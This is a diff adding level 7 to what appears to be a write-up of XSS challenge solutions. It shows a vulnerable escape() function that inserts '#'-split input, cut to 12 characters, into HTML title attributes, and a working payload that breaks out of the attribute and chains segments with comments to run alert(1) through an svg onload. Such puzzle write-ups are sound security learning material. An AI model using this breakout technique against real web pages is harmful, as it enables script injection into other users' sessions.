@@ -77,3 +77,17 @@ function escape(input) {
         document.write("Action forbidden.")               
 </script>                                                
         
+7) Code:
+function escape(input) {
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+    return segments.map(function(title) {
+        // title can only contain 12 characters
+        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
+    }).join('\n');
+} 
+
+Character are limited to 12 only and allowed # as input. 
+Payload can be created using # which is allowed atq code.
+Payload: "><svg/a=#"onload='/*#*/alert(1)' 
+In this case closing onload with '' seems good option to get xss trigerred. 
